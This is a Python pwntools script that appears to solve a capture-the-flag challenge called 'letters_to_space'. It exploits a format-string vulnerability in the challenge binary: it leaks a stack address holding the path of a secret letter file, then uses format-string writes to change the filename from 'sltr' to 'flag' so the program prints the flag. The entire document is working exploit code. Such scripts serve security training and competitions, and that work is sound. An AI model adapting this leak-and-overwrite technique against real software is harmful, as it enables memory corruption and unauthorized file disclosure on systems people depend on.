#!/usr/bin/env python3

from pwn import *

HOST = "localhost"
PORT = 1337

SENDER_PROMPT = b"Enter sender: "
RECIPIENT_PROMPT = b"Enter recipient: "
CONTENT_PROMPT = b"Enter contents: "
CHOICE_PROMPT = b"> "

CONTENT_START_MARKER = b",\n\n"
CONTENT_END_MARKER = b"\n\nFrom"

DUMMY_SENDER = b"alice"
DUMMY_RECIPIENT = b"bob"
DUMMY_CONTENT = b"lmao"

SECRET_LETTER_PATH_OFFSET = 7
SECRET_LETTER_FILENAME = b"sltr"
TARGET_FILENAME = b"flag"


elf = context.binary = ELF("./letters_to_space")

if args.REMOTE:
    io = remote(HOST, PORT)
else:
    io = elf.process()


def send_payload(payload: bytes) -> bytes:
    io.sendlineafter(SENDER_PROMPT, DUMMY_SENDER)
    io.sendlineafter(RECIPIENT_PROMPT, DUMMY_RECIPIENT)
    io.sendlineafter(CONTENT_PROMPT, payload)

    io.recvuntil(CONTENT_START_MARKER)
    response = io.recvuntil(CONTENT_END_MARKER, drop=True)

    io.sendlineafter(CHOICE_PROMPT, b"1")

    return response


def get_flag() -> str:
    io.sendlineafter(SENDER_PROMPT, DUMMY_SENDER)
    io.sendlineafter(RECIPIENT_PROMPT, DUMMY_RECIPIENT)
    io.sendlineafter(CONTENT_PROMPT, DUMMY_CONTENT)

    io.sendlineafter(CHOICE_PROMPT, b"2")
    io.sendlineafter(CHOICE_PROMPT, b"1")

    return io.recvlineS()


fmt = FmtStr(execute_fmt=send_payload)

secret_letter_path = fmt.leak_stack(SECRET_LETTER_PATH_OFFSET)

fmt.write(
    secret_letter_path
    + elf.string(elf.sym.SECRET_LETTER_PATH).index(SECRET_LETTER_FILENAME),
    TARGET_FILENAME,
)
fmt.execute_writes()

log.success(f"Flag: {get_flag()}")

io.close()
